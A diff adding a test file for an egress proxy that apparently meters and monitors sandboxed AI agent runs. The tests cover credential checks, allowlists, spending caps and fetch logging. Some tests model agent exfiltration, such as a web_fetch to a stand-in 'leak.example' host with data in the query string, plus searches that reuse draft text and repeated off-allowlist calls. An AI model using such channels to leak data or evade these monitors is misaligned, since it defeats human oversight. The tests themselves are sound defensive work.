@@ -1,0 +1,347 @@
+import { describe, expect, it } from "vitest";
+import { InMemoryCapAccountant } from "./cap.js";
+import type { RunContext, RunContextResolver } from "./context.js";
+import { PROXY_CREDENTIAL_HEADER, AGENT_ID_HEADER } from "./credential.js";
+import { handleProxyRequest, type Forwarder, type HandlerDeps, type ProxyRequest, type UpstreamResponse } from "./handler.js";
+import { NovelDomainTracker } from "./outbound-limits.js";
+import {
+  InMemoryFetchLogWriter,
+  InMemoryUsageWriter,
+  StaticSecretProvider,
+} from "./sinks.js";
+import { DenialSpikeTracker, InMemoryEventSink } from "./signals.js";
+
+const CRED = "cred-1";
+
+function ctx(overrides: Partial<RunContext> = {}): RunContext {
+  return {
+    runId: "run_1",
+    attempt: 1,
+    agentId: "editor",
+    role: "editor",
+    workspaceId: "ws_1",
+    billingAccountId: "bill_1",
+    projectId: "proj_1",
+    provider: "anthropic",
+    modelTier: "frontier",
+    rateTableVersion: 1,
+    capCredits: 1_000_000,
+    allowlist: {
+      endpoints: [{ host: "api.anthropic.com", pathPrefix: "/v1/messages" }],
+      models: ["claude-opus-5"],
+    },
+    urlPolicy: { blockedDomains: ["holdout.example"] },
+    ...overrides,
+  };
+}
+
+function resolverFor(map: Record<string, RunContext>): RunContextResolver {
+  return { resolve: (c) => map[c] ?? null };
+}
+
+/** A messages response body with a full usage block (Opus 5: 1M in + 1M out = $30 list → 4200 credits). */
+function opusResponse(): string {
+  return JSON.stringify({
+    id: "msg_1",
+    model: "claude-opus-5",
+    usage: { input_tokens: 1_000_000, output_tokens: 1_000_000 },
+  });
+}
+
+interface Harness extends HandlerDeps {
+  usageWriter: InMemoryUsageWriter;
+  fetchLogWriter: InMemoryFetchLogWriter;
+  events: InMemoryEventSink;
+  capAccountant: InMemoryCapAccountant;
+  forwarded: { req?: Parameters<Forwarder>[0] };
+}
+
+function harness(opts: {
+  context?: RunContext | null;
+  response?: UpstreamResponse;
+  capAccountant?: InMemoryCapAccountant;
+} = {}): Harness {
+  const context = opts.context === undefined ? ctx() : opts.context;
+  const map: Record<string, RunContext> = context ? { [CRED]: context } : {};
+  const forwarded: { req?: Parameters<Forwarder>[0] } = {};
+  const response = opts.response ?? {
+    status: 200,
+    headers: { "content-type": "application/json" },
+    body: opusResponse(),
+  };
+  const forward: Forwarder = async (req) => {
+    forwarded.req = req;
+    return response;
+  };
+  let counter = 0;
+  return {
+    resolver: resolverFor(map),
+    secrets: new StaticSecretProvider("sk-PROVIDER"),
+    forward,
+    usageWriter: new InMemoryUsageWriter(),
+    fetchLogWriter: new InMemoryFetchLogWriter(),
+    capAccountant: opts.capAccountant ?? new InMemoryCapAccountant(),
+    events: new InMemoryEventSink(),
+    denialSpikes: new DenialSpikeTracker(),
+    novelDomains: new NovelDomainTracker(),
+    newId: () => `id_${++counter}`,
+    now: () => new Date("2026-09-02T00:00:00.000Z"),
+    forwarded,
+  };
+}
+
+function request(overrides: Partial<ProxyRequest> = {}): ProxyRequest {
+  return {
+    method: "POST",
+    host: "api.anthropic.com",
+    path: "/v1/messages",
+    url: "https://api.anthropic.com/v1/messages",
+    headers: {
+      [PROXY_CREDENTIAL_HEADER]: CRED,
+      authorization: "Bearer sandbox-token",
+      "x-api-key": "sk-sandbox",
+      "content-type": "application/json",
+    },
+    body: JSON.stringify({ model: "claude-opus-5", messages: [{ role: "user", content: "hi" }] }),
+    ...overrides,
+  };
+}
+
+describe("handleProxyRequest — credential gate (AC1)", () => {
+  it("refuses a credential-less request with 403 egress.denied and never forwards", async () => {
+    const h = harness();
+    const headers = { "content-type": "application/json" };
+    const res = await handleProxyRequest(request({ headers }), h);
+    expect(res.status).toBe(403);
+    expect(JSON.parse(res.body).error.type).toBe("egress.denied");
+    expect(h.events.egressDenied).toHaveLength(1);
+    expect(h.events.egressDenied[0]!.reason).toContain("missing");
+    expect(h.forwarded.req).toBeUndefined();
+    // No run to attribute → no fetch_log row.
+    expect(h.fetchLogWriter.rows).toHaveLength(0);
+  });
+
+  it("refuses an invalid credential (binds to no run) with 403", async () => {
+    const h = harness();
+    const res = await handleProxyRequest(request({ headers: { [PROXY_CREDENTIAL_HEADER]: "bogus" } }), h);
+    expect(res.status).toBe(403);
+    expect(h.forwarded.req).toBeUndefined();
+  });
+
+  it("refuses an off-allowlist endpoint with 403 + a deny fetch_log row", async () => {
+    const h = harness();
+    const res = await handleProxyRequest(request({ host: "evil.example", url: "https://evil.example/v1/messages" }), h);
+    expect(res.status).toBe(403);
+    expect(h.forwarded.req).toBeUndefined();
+    expect(h.fetchLogWriter.rows).toHaveLength(1);
+    expect(h.fetchLogWriter.rows[0]).toMatchObject({ decision: "deny", status: 403, attempt: 1, runId: "run_1" });
+    expect(h.events.egressDenied).toHaveLength(1);
+  });
+
+  it("refuses an off-allowlist model with 403", async () => {
+    const h = harness();
+    const body = JSON.stringify({ model: "claude-fable-5-1", messages: [] });
+    const res = await handleProxyRequest(request({ body }), h);
+    expect(res.status).toBe(403);
+    expect(JSON.parse(res.body).error.message).toContain("claude-fable-5-1");
+    expect(h.forwarded.req).toBeUndefined();
+  });
+});
+
+describe("handleProxyRequest — serve, scrub, meter, log (AC3, AC5, AC6)", () => {
+  it("forwards with the provider key, strips sandbox auth, meters the response, logs the request", async () => {
+    const h = harness();
+    const res = await handleProxyRequest(request(), h);
+    expect(res.status).toBe(200);
+
+    // AC5: sandbox Authorization + x-api-key never forwarded; only the injected provider key reaches upstream.
+    const fwd = h.forwarded.req!;
+    expect(fwd.headers["authorization"]).toBeUndefined();
+    expect(fwd.headers["x-api-key"]).toBe("sk-PROVIDER");
+    expect(fwd.headers[PROXY_CREDENTIAL_HEADER]).toBeUndefined();
+
+    // Metered into the rows of record (Opus 5: $30 list → 4200 credits).
+    expect(h.usageWriter.rows).toHaveLength(1);
+    expect(h.usageWriter.rows[0]).toMatchObject({
+      runId: "run_1",
+      source: "proxy",
+      model: "claude-opus-5",
+      listCostUsd: 30,
+      credits: 4200,
+    });
+    expect(h.capAccountant.spentCredits("run_1")).toBeCloseTo(4200, 6);
+
+    // AC6: a fetch_log row for the served request, tagged run/attempt/agent, url, status, decision.
+    const infRows = h.fetchLogWriter.rows.filter((r) => r.kind === "inference");
+    expect(infRows).toHaveLength(1);
+    expect(infRows[0]).toMatchObject({
+      runId: "run_1",
+      attempt: 1,
+      agentLabel: "editor",
+      url: "https://api.anthropic.com/v1/messages",
+      status: 200,
+      decision: "allow",
+    });
+  });
+
+  it("attributes a subagent via the harness agent-id header", async () => {
+    const h = harness();
+    const headers = { [PROXY_CREDENTIAL_HEADER]: CRED, [AGENT_ID_HEADER]: "second-reader", "content-type": "application/json" };
+    await handleProxyRequest(request({ headers }), h);
+    expect(h.usageWriter.rows[0]!.subagentLabel).toBe("second-reader");
+    expect(h.fetchLogWriter.rows[0]!.agentLabel).toBe("second-reader");
+  });
+
+  it("meters server_tool_use + cache-write tokens (AC3)", async () => {
+    const response: UpstreamResponse = {
+      status: 200,
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({
+        model: "claude-opus-5",
+        usage: {
+          input_tokens: 0,
+          output_tokens: 0,
+          cache_creation_input_tokens: 1_000_000,
+          server_tool_use: { web_search_requests: 10 },
+        },
+      }),
+    };
+    const h = harness({ response });
+    await handleProxyRequest(request(), h);
+    // cache write 1.25 × $5 = $6.25 + 10 × $0.01 = $6.35 list.
+    expect(h.usageWriter.rows[0]).toMatchObject({ cacheWriteTokens: 1_000_000, searches: 10, listCostUsd: 6.35 });
+  });
+
+  it("does not meter a non-2xx response but still logs the request", async () => {
+    const response: UpstreamResponse = {
+      status: 429,
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({ error: { type: "overloaded" } }),
+    };
+    const h = harness({ response });
+    const res = await handleProxyRequest(request(), h);
+    expect(res.status).toBe(429);
+    expect(h.usageWriter.rows).toHaveLength(0);
+    expect(h.fetchLogWriter.rows.filter((r) => r.kind === "inference")).toHaveLength(1);
+  });
+});
+
+describe("handleProxyRequest — cap enforcement (AC2)", () => {
+  it("serves the request that crosses the cap, then refuses the next with 402 budget", async () => {
+    // cap 4000 credits; each opus response meters 4200 → the first serves and crosses, the second is refused.
+    const shared = new InMemoryCapAccountant();
+    const context = ctx({ capCredits: 4000 });
+    const h1 = harness({ context, capAccountant: shared });
+    const first = await handleProxyRequest(request(), h1);
+    expect(first.status).toBe(200);
+    expect(shared.spentCredits("run_1")).toBeCloseTo(4200, 6);
+    // Σ usage rows reflect the served (crossing) response.
+    expect(h1.usageWriter.rows).toHaveLength(1);
+
+    const h2 = harness({ context, capAccountant: shared });
+    const second = await handleProxyRequest(request(), h2);
+    expect(second.status).toBe(402);
+    expect(JSON.parse(second.body).error.type).toBe("budget");
+    expect(h2.forwarded.req).toBeUndefined();
+    // The refused request is logged as a deny, but never metered.
+    expect(h2.usageWriter.rows).toHaveLength(0);
+    expect(h2.fetchLogWriter.rows.some((r) => r.decision === "deny" && r.denyReason === "cap")).toBe(true);
+  });
+});
+
+describe("handleProxyRequest — outbound-channel limits (AC4)", () => {
+  it("strips a web_fetch URL whose query string exceeds 256 chars before forwarding", async () => {
+    const longQuery = "d=" + "a".repeat(298);
+    const body = JSON.stringify({
+      model: "claude-opus-5",
+      messages: [
+        {
+          role: "assistant",
+          content: [{ type: "tool_use", name: "web_fetch", input: { url: `https://leak.example/p?${longQuery}` } }],
+        },
+      ],
+    });
+    const h = harness();
+    await handleProxyRequest(request({ body }), h);
+    const fwdBody = JSON.parse(h.forwarded.req!.body) as {
+      messages: { content: { input: { url: string } }[] }[];
+    };
+    // The over-long query is stripped from the OUTBOUND body before it can leave.
+    expect(fwdBody.messages[0]!.content[0]!.input.url).toBe("https://leak.example/p");
+  });
+
+  it("logs THIS turn's server-tool activity from the response (fetch log of record), not from request history", async () => {
+    const response: UpstreamResponse = {
+      status: 200,
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({
+        model: "claude-opus-5",
+        usage: { input_tokens: 1, output_tokens: 1 },
+        content: [
+          { type: "server_tool_use", name: "web_search", input: { query: "widgets review" } },
+          { type: "server_tool_use", name: "web_fetch", input: { url: "https://src.example/a" } },
+          { type: "text", text: "answer" },
+        ],
+      }),
+    };
+    const h = harness({ response });
+    await handleProxyRequest(request(), h);
+    const search = h.fetchLogWriter.rows.filter((r) => r.kind === "search");
+    const fetch = h.fetchLogWriter.rows.filter((r) => r.kind === "fetch");
+    expect(search).toHaveLength(1);
+    expect(search[0]).toMatchObject({ query: "widgets review", decision: "allow", attempt: 1 });
+    expect(fetch).toHaveLength(1);
+    expect(fetch[0]).toMatchObject({ url: "https://src.example/a", decision: "allow" });
+  });
+
+  it("emits suspicious_query + a pause signal and refuses when a search shares ≥12 draft words", async () => {
+    const draft = "the quick brown fox jumps over the lazy dog while the cat sleeps in the sun";
+    const context = ctx({ draftText: draft });
+    const body = JSON.stringify({
+      model: "claude-opus-5",
+      messages: [
+        {
+          role: "assistant",
+          content: [
+            {
+              type: "server_tool_use",
+              name: "web_search",
+              input: { query: "the quick brown fox jumps over the lazy dog while the cat" },
+            },
+          ],
+        },
+      ],
+    });
+    const h = harness({ context });
+    const res = await handleProxyRequest(request({ body }), h);
+    expect(res.status).toBe(403);
+    expect(JSON.parse(res.body).error.type).toBe("suspicious_query");
+    expect(h.forwarded.req).toBeUndefined();
+    expect(h.events.pauseSignals).toHaveLength(1);
+    expect(h.events.pauseSignals[0]).toMatchObject({ runId: "run_1", reason: "suspicious_query" });
+    expect(h.fetchLogWriter.rows.some((r) => r.kind === "search" && r.denyReason === "suspicious_query")).toBe(true);
+  });
+
+  it("injects the run's blocked domains into a server web tool before forwarding (§12.6)", async () => {
+    const body = JSON.stringify({
+      model: "claude-opus-5",
+      messages: [{ role: "user", content: "hi" }],
+      tools: [{ type: "web_search_20250305", name: "web_search" }],
+    });
+    const h = harness();
+    await handleProxyRequest(request({ body }), h);
+    const fwdBody = JSON.parse(h.forwarded.req!.body) as { tools: { blocked_domains?: string[] }[] };
+    expect(fwdBody.tools[0]!.blocked_domains).toContain("holdout.example");
+  });
+});
+
+describe("handleProxyRequest — denial spike pause (REQ-ARCH-32)", () => {
+  it("emits a single pause signal once egress denials reach the spike threshold", async () => {
+    // Reuse one events sink + spike tracker across denials by sharing the harness.
+    const h = harness();
+    const offAllowlist = request({ host: "evil.example", url: "https://evil.example/v1/messages" });
+    for (let i = 0; i < 5; i++) await handleProxyRequest(offAllowlist, h);
+    expect(h.events.egressDenied.length).toBe(5);
+    expect(h.events.pauseSignals.filter((s) => s.reason === "egress_denied_spike")).toHaveLength(1);
+  });
+});
